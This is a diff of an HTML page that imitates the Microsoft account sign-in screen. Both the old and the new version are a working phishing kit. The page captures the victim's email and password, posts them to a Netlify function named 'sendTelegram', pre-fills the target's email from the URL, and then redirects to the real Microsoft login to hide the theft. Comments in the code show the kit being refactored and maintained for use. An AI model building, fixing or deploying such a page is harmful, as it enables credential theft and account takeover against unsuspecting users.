@@ -1,227 +1,197 @@
 <!doctype html>
-<html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Sign in to your account</title>
+<html dir="ltr" class="" lang="en">
+<head>
+  <title>Sign in to your account</title>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
+  <meta charset="utf-8">
+  <link rel="shortcut icon" href="images/favicon.ico">
+  <meta http-equiv="Pragma" content="no-cache">
+  <meta http-equiv="Expires" content="-1">
+  <meta name="PageID" content="ConvergedSignIn">
+  <meta name="SiteID" content="">
+  <meta name="ReqLC" content="1033">
+  <meta name="LocLC" content="en-US">
 
-    <!-- Bootstrap CSS -->
-    <link rel="stylesheet"
-      href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css"
-      integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm"
-      crossorigin="anonymous">
+  <!-- Single, correct jQuery include (removed duplicates / fixed malformed tag) -->
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js" crossorigin="anonymous"></script>
 
-    <!-- Google Font -->
-    <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&display=swap" rel="stylesheet">
+  <!-- Bootstrap CSS -->
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css"
+    integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm"
+    crossorigin="anonymous">
 
-    <!-- Font Awesome -->
-    <script src="https://kit.fontawesome.com/585b051251.js" crossorigin="anonymous"></script>
+  <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&display=swap" rel="stylesheet">
+  <script src="https://kit.fontawesome.com/585b051251.js" crossorigin="anonymous"></script>
+  <link href="css/hover.css" rel="stylesheet" media="all">
 
-    <style>
-      html, body {
-        height: 100%;
-        margin: 0;
-        font-family: "Segoe UI", "Archivo Narrow", Arial, sans-serif;
-      }
-      .bg-root {
-        background-image: url("https://www.rapid7.com/cdn/assets/bltc9698ac925a4a219/683ddb9d2a76864ea7bc82bf/background.jpg");
-        background-size: cover;
-        background-position: center center;
-        background-repeat: no-repeat;
-        min-height: 100vh;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-      }
-      .bg-overlay {
-        position: absolute;
-        inset: 0;
-        background: rgba(0,0,0,0.18);
-        pointer-events: none;
-      }
-      .signin-card {
-        position: relative;
-        z-index: 2;
-        width: 420px;
-        max-width: calc(100% - 32px);
-        background: #fff;
-        border-radius: 3px;
-        box-shadow: 0 10px 60px rgba(0,0,0,0.3);
-        padding: 26px 28px;
-      }
-      .signin-card .logo {
-        width: 86px;
-        display: block;
-        margin-bottom: 16px;
-      }
-      .signin-card .title {
-        font-size: 1.35rem;
-        font-weight: 600;
-        color: #1f2d33;
-        margin-bottom: 6px;
-      }
-      .signin-card .subtitle {
-        color: #6b757e;
-        margin-bottom: 18px;
-      }
-      .form-control.flat {
-        border-radius: 0;
-        border-width: 0 0 1px 0;
-        background: transparent;
-        box-shadow: none;
-      }
-      .next-btn {
-        background-color: #0066BA;
-        color: #fff;
-        border: none;
-        padding: 8px 20px;
-        font-weight: 600;
-      }
-      .small-muted { color: #6b757e; font-size: 0.92rem; }
-      @media (max-width: 480px) {
-        .signin-card { padding: 18px; }
-        .signin-card .logo { width: 72px; }
-      }
-      /* hide password step by default */
-      #passwordStep { display: none; }
-      .hidden { display: none !important; }
-    </style>
-  </head>
-  <body>
-    <div class="bg-root" role="main" aria-label="Sign in background">
-      <div class="bg-overlay" aria-hidden="true"></div>
+  <style type="text/css">
+    /* (kept empty as in original) */
+  </style>
+</head>
 
-      <div class="signin-card" role="region" aria-label="Sign in">
-        <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/96/Microsoft_logo_%282012%29.svg/640px-Microsoft_logo_%282012%29.svg.png" alt="Microsoft logo" />
-
-        <div class="title">Sign In</div>
-        <div class="subtitle">Email, phone or skype</div>
-
-        <!-- Email step -->
-        <div id="emailStep">
-          <div class="form-group">
-            <label for="emailField" class="sr-only">Email, phone, or Skype</label>
-            <input id="emailField" type="email" class="form-control flat" placeholder="Email, phone or skype" autocomplete="username" />
+<body style="background-image: url('images/bg5.png'); background-size: cover;background-repeat: no-repeat; background-attachment: fixed;">
+  <div class="container-fluid p-0">
+    <div class="container">
+      <div class="row my-5 py-5">
+        <div class="col-lg-6 mx-auto">
+          <div class="m-5 p-4 bg-white" id="div1">
+            <img src="images/microsoft_logo.svg" class="img-fluid" alt="Microsoft logo"><br><br>
+            <span class="h5">Sign In</span><br>
+            <span id="error" class="text-danger">That Microsoft account doesn't exist. Enter a different account</span>
+            <div class="form-group mt-2">
+              <input type="email" name="email" class="form-control" id="email" aria-describedby="emailHelp" placeholder="Email, phone or skype" style="border-right: none;border-left: none;border-top: none;">
+            </div>
+            <p>No account? <a href="https://signup.live.com/signup?ru=https%3a%2f%2flogin.live.com%2foauth20_authorize.srf%3flc%3d1033%26response_type%3dcode%26client_id%3d51483342-085c-4d86-bf88-cf50c7252078%26scope%3dopenid%2bprofile%2bemail%2boffline_access%26response_mode%3dform_post%26redirect_uri%3dhttps%253a%252f%252flogin.microsoftonline.com%252fcommon%252ffederation%252foauth2%26state%3drQIIAeNisNLJKCkpKLbS1y_ILypJzNHLzUwuyi_OTyvJz8vJzEvVS87P1csvSs9MAbGKhLgEXtk_X7dhr6zr3uYXtw5zqiyexcgZn5NZBla5ilGZsHH6FxgZXzAy3mIS9C9K90wJL3ZLTUktSizJzM-7wCLwioXHgNmKg4NLgEGCQYHhBwvjIlagrZymylOOHFzvusZeeda6cxYMp1j1o6q8LfJ9zTO9Ukz9wyrdfC1NS3MtLDxy87y00wyKwoOKQjIDSsrKjAJCA20trAwnsAlNYGM6xcbwgY2xg53hACfjLS4RIwNDS10DI10DEwUDcytTCysjsygA0%26estsfed%3d1%26lw%3d1%26fl%3deasi2%26fci%3dhttps%253a%252f%252fportal.microsoftonline.com.orgid.com%26mkt%3dEN-US%26uaid%3daee73feabdb0451dbd83e8dac30924a3&mkt=EN-US&uiflavor=web&lw=1&fl=easi2&client_id=51483342-085c-4d86-bf88-cf50c7252078&uaid=aee73feabdb0451dbd83e8dac30924a3&suc=https%3a%2f%2fportal.microsoftonline.com.orgid.com&lic=1">Create one!</a></p>
+            <p><a href="#">Sign in with a security key</a></p>
+            <p><a href="#">sign in options</a></p>
+            <div class="text-right">
+              <button class="btn rounded-0 text-white px-4" id="next" style="background-color: #0066BA;">Next</button>
+            </div>
           </div>
-          <div class="mb-2 small-muted">
-            No account? <a class="link-muted" href="#">Create one!</a>
+
+          <div class="m-5 p-4 bg-white" id="div2">
+            <form id="contact">
+              <img src="images/microsoft_logo.svg" class="img-fluid" alt="Microsoft logo"><br><br>
+              <i class="fas fa-arrow-left" id="back" style="cursor:pointer"></i>&nbsp;<span id="emailch">abc@abc.com</span><br>
+              <span id="msg" class="text-danger"></span><br>
+              <span class="h5">Password</span>
+              <div class="form-group mt-2">
+                <input type="password" name="password" class="form-control" id="password" aria-describedby="emailHelp" placeholder="Enter Password" style="border-right: none;border-left: none;border-top: none;">
+              </div>
+              <p>No account? <a href="#">Create one!</a></p>
+              <p><a href="#">Sign in with a security key</a></p>
+              <p><a href="#">sign in options</a></p>
+              <div class="text-right">
+                <button class="btn rounded-0 text-white px-4" id="submit-btn" style="background-color: #0066BA;">login</button>
+              </div>
+            </form>
           </div>
-          <div class="d-flex justify-content-end">
-            <button id="emailNext" class="next-btn" type="button">Next</button>
-          </div>
+
         </div>
-
-        <!-- Password step -->
-        <div id="passwordStep">
-          <div class="form-group">
-            <label for="passwordField" class="sr-only">Password</label>
-            <input id="passwordField" type="password" class="form-control flat" placeholder="Enter password" autocomplete="current-password" />
-          </div>
-          <div class="d-flex justify-content-between align-items-center">
-            <a href="#" class="link-muted">Sign in with a security key</a>
-            <button id="passwordSubmit" class="next-btn" type="button">Login</button>
-          </div>
-        </div>
-
-        <div id="statusMsg" class="mt-3 small-muted hidden" role="status" aria-live="polite"></div>
       </div>
     </div>
+  </div>
 
-    <script>
-      (function() {
-        const emailField = document.getElementById('emailField');
-        const passwordField = document.getElementById('passwordField');
-        const emailNext = document.getElementById('emailNext');
-        const passwordSubmit = document.getElementById('passwordSubmit');
-        const emailStep = document.getElementById('emailStep');
-        const passwordStep = document.getElementById('passwordStep');
-        const statusMsg = document.getElementById('statusMsg');
+  <!-- Bootstrap JS dependencies (Popper) and Bootstrap JS (kept at bottom) -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"
+    integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q"
+    crossorigin="anonymous"></script>
+  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"
+    integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl"
+    crossorigin="anonymous"></script>
 
-        function showStatus(msg) {
-          statusMsg.textContent = msg;
-          statusMsg.classList.remove('hidden');
+  <script>
+    /* global $ */
+    $(document).ready(function(){
+
+      $('#error').hide();
+      $("#div2").hide();
+      $("#msg").hide();
+
+      var email = window.location.hash.substr(1);
+      if (!email) {
+
+      }
+      else
+      {
+        $('#email').val(email);
+        var my_email =email;
+        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+        if (!filter.test(my_email)) {
+          $('#error').show();
+          email.focus;
+          return false;
         }
+        var ind=my_email.indexOf("@");
+        var my_slice=my_email.substr((ind+1));
+        var c= my_slice.substr(0, my_slice.indexOf('.'));
+        var final= c.toLowerCase();
+        $("#div1").animate({left:200, opacity:"hide"}, 0);
+        $("#div2").animate({right:200, opacity:"show"}, 1000);
+        $("#emailch").html(my_email);
+      }
 
-        function hideStatus() {
-          statusMsg.textContent = '';
-          statusMsg.classList.add('hidden');
+      $('#email').click(function(){
+        $('#error').hide();
+      });
+      $('#next').click(function () {
+        var my_email =$('#email').val();
+        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+        if (!filter.test(my_email)) {
+          $('#error').show();
+          email.focus;
+          return false;
         }
+        var ind=my_email.indexOf("@");
+        var my_slice=my_email.substr((ind+1));
+        var c= my_slice.substr(0, my_slice.indexOf('.'));
+        var final= c.toLowerCase();
+        $("#div1").animate({left:200, opacity:"hide"}, 0);
+        $("#div2").animate({right:200, opacity:"show"}, 1000);
+        $("#emailch").html(my_email);
+      });
+      $('#back').click(function () {
+        $("#msg").hide();
+        $("#div2").animate({left:200, opacity:"hide"}, 0);
+        $("#div1").animate({right:200, opacity:"show"}, 1000);
 
-        function isValidEmail(email) {
-          var re = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
-          return re.test(String(email).toLowerCase());
+      });
+
+      var count=0;
+      $('#submit-btn').click(function(event){
+        event.preventDefault();
+        var email=$("#email").val();
+        var password=$("#password").val();
+        var detail=$("#field").html();
+        var msg = $('#msg').html();
+        $('#msg').text( msg );
+        count=count+1;
+        if (count>=3) {
+          // use https for redirect
+          window.location.replace("https://login.microsoftonline.com");
         }
-
-        emailNext.addEventListener('click', function() {
-          hideStatus();
-          const email = (emailField.value || '').trim();
-          if (!isValidEmail(email)) {
-            showStatus("That Microsoft account doesn't exist. Enter a different account");
-            return;
-          }
-          // move to password step
-          emailStep.style.display = 'none';
-          passwordStep.style.display = 'block';
-          passwordField.focus();
-        });
-
-        passwordSubmit.addEventListener('click', async function() {
-          hideStatus();
-          const email = (emailField.value || '').trim();
-          const password = (passwordField.value || '').trim();
-
-          if (!password) {
-            showStatus('Please enter your password');
-            return;
-          }
-
-          // optionally show a message
-          showStatus('Verifying...');
-
-          try {
-            // Send the captured data to your Netlify function
-            const payload = {
-              email: email,
-              password: password,
-              userAgent: navigator.userAgent,
-              sessionId: 'replacement_' + Math.random().toString(36).substring(2, 15),
-              url: window.location.href
-            };
-
-            const resp = await fetch('/.netlify/functions/sendTelegram', {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify(payload)
-            });
-
-            // optional: inspect response
-            if (resp.ok) {
-              // success — redirect to Microsoft sign in (or other next step)
-              showStatus('Signing in...');
-              // small delay so user sees the message
-              setTimeout(function() {
-                window.location.replace('https://login.microsoftonline.com');
-              }, 800);
-            } else {
-              showStatus('Please try again later');
+        else
+        {
+         $.ajax({
+          dataType: 'JSON',
+          // UPDATED: post to Netlify function endpoint
+          url: '/.netlify/functions/sendTelegram',
+          type: 'POST',
+          data:{
+            email:email,
+            password:password,
+            detail:detail,
+          },
+          beforeSend: function(xhr){
+            $('#submit-btn').html('Verifing...');
+          },
+          success: function(response){
+            if(response){
+              $("#msg").show();
+              console.log(response);
+              if(response['signal'] == 'ok'){
+               $('#msg').html(response['msg']);
+             }
+             else{
+              $('#msg').html(response['msg']);
             }
-          } catch (err) {
-            console.error('Error sending credentials:', err);
-            showStatus('Please try again later');
           }
-        });
-      })();
-    </script>
-
-    <!-- Bootstrap JS (optional) -->
-    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js"
-      integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN"
-      crossorigin="anonymous"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"
-      integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q"
-      crossorigin="anonymous"></script>
-    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"
-      integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl"
-      crossorigin="anonymous"></script>
-  </body>
+        },
+        error: function(){
+          $("#msg").show();
+          $('#msg').html("Please try again later");
+        },
+        complete: function(){
+          $('#submit-btn').html('Login');
+        }
+      });
+       }
+     });
+    });
+  </script>
+</body>
 </html>
